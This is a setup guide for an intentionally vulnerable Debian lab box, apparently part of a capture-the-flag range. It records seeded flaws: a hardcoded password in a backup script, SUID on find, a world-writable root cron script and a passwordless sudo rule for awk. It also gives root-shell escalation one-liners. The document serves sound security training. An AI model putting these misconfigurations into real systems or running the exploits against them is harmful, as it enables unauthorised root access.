# LNX Setup

## Overview

LNX is a Debian 13 (Trixie) machine serving as the external-facing foothold box, OpenVPN server, and DMZ pivot point. It is intentionally not domain-joined and contains multiple vulnerabilities for initial access and privilege escalation practice.

---

## Specs

| Property | Value |
|---|---|
| OS | Debian 13 (Trixie) with GUI desktop |
| RAM | 1GB |
| Disk | 20GB |
| IP (DMZ) | 192.168.60.10 (ens37, static) |
| IP (NAT) | 192.168.254.x (ens33, DHCP) |
| Domain joined | No |

---

## Network Configuration

Two network adapters:
- **ens33** → VMnet8 NAT (internet-facing, for VPN connectivity)
- **ens37** → VMnet3 DMZ (lab network, static IP)

Static IP set via NetworkManager:
```bash
sudo nmcli con add type ethernet ifname ens37 con-name dmz-static ip4 192.168.60.10/24
sudo nmcli con up dmz-static
```

IP forwarding enabled for OpenVPN subnet routing:
```bash
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

## Services

### DVWA (Port 80)

Running via Docker with a bind mount exposing `/opt/scripts` inside the container:

```bash
docker run -d -p 80:80 --restart unless-stopped \
  -v /opt/scripts:/opt/scripts:ro \
  --name dvwa vulnerables/web-dvwa
```

Security level set to **Low** inside DVWA (Setup → DVWA Security → Low).

### SSH (Port 22)

```bash
sudo apt install openssh-server -y
sudo systemctl enable --now ssh
```

`PasswordAuthentication yes` confirmed in `/etc/ssh/sshd_config`.

### OpenVPN (UDP 1194)

PKI generated via Easy-RSA, server config at `/etc/openvpn/server.conf`. Pushes route to `192.168.60.0/24` so VPN clients can reach the DMZ segment.

```bash
sudo systemctl enable --now openvpn@server
```

NAT rule for tunnel traffic:
```bash
sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o ens37 -j MASQUERADE
sudo netfilter-persistent save
```

---

## Users

| Username | Password | Group | Notes |
|---|---|---|---|
| starboy | summer2024 | users (no sudo) | Primary attack target account |
| root | (set during install) | root | Only reachable via PE |

---

## Vulnerabilities Seeded

### Initial Access

**T1190 — Exploit Public-Facing Application**
DVWA running on port 80 with security level set to Low. File Upload module allows unrestricted PHP webshell upload.

**T1552.001 — Credentials In Files**
`/opt/scripts/backup.sh` is world-readable and contains hardcoded credentials:
```bash
sshpass -p 'summer2024' rsync -avz /var/www/ starboy@localhost:/backups/
```

**T1078 — Valid Accounts**
`starboy:summer2024` is a valid SSH account discoverable via the credential file above.

### Privilege Escalation

**T1548.001 — Setuid and Setgid**
SUID bit set on `/usr/bin/find`:
```bash
sudo chmod u+s /usr/bin/find
```
Exploit:
```bash
find . -exec /bin/sh -p \; -quit
```

**T1053.003 — Cron**
Root-owned cron job at `/etc/cron.d/backup-job` executes `/opt/scripts/root-backup.sh` every minute. That script is world-writable:
```bash
sudo chmod 777 /opt/scripts/root-backup.sh
```
Exploit: overwrite the script, wait for cron execution.

**T1548.003 — Sudo and Sudo Caching**
`starboy` has a narrow sudo rule allowing `awk` without password:
```
starboy ALL=(root) NOPASSWD: /usr/bin/awk
```
Exploit:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

## Flags

| Flag | Path | Readable by |
|---|---|---|
| user.txt | /home/starboy/user.txt | starboy |
| root.txt | /root/root.txt | root only |
